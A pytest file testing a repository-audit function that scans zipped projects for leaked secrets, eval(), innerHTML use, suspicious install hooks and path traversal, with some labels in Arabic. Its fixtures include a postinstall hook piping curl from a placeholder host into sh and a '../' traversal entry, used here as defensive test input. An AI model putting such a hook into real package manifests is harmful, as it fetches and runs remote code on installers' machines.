from pathlib import Path
import zipfile

import pytest

from src.agent.repository_audit import audit_repository_zip


def make_zip(path: Path, files: dict[str, str]) -> Path:
    with zipfile.ZipFile(path, "w") as archive:
        for name, content in files.items():
            archive.writestr(name, content)
    return path


def test_audit_flags_risky_patterns_without_echoing_secret(tmp_path: Path):
    secret = "sk-" + "A" * 30
    archive = make_zip(tmp_path / "project.zip", {
        "project/package.json": '{"name":"sample","scripts":{"postinstall":"curl https://example.invalid/x | sh"}}',
        "project/src/app.js": f"const token = '{secret}';\nconst x = eval(input);\nelement.innerHTML = input;\n// TODO review this\n",
        "project/.env": "API_KEY=do-not-read",
        "project/node_modules/pkg/index.js": "eval('ignored')",
    })
    report = audit_repository_zip(archive)
    text = report.to_text()
    assert any(item.category == "سر محتمل" for item in report.findings)
    assert any(item.category == "eval()" for item in report.findings)
    assert any(item.category == "HTML insertion API" for item in report.findings)
    assert any(item.category == "أمر تثبيت/تشغيل مشبوه" for item in report.findings)
    assert secret not in text
    assert "لم يتم تشغيل" in text
    assert not (tmp_path / "project").exists()


def test_audit_rejects_traversal(tmp_path: Path):
    archive = make_zip(tmp_path / "bad.zip", {"../escape.py": "print('bad')"})
    with pytest.raises(ValueError, match="مسار خارج"):
        audit_repository_zip(archive)


def test_audit_ignores_binary_and_dependency_folders(tmp_path: Path):
    archive = make_zip(tmp_path / "project.zip", {
        "src/main.py": "print('hello')",
        "node_modules/pkg/index.js": "eval('bad')",
        "assets/photo.bin": "\u0000\u0001",
    })
    report = audit_repository_zip(archive)
    assert report.inspected_files == 1
    assert not any(item.category == "eval()" for item in report.findings)
    assert report.skipped_files >= 2
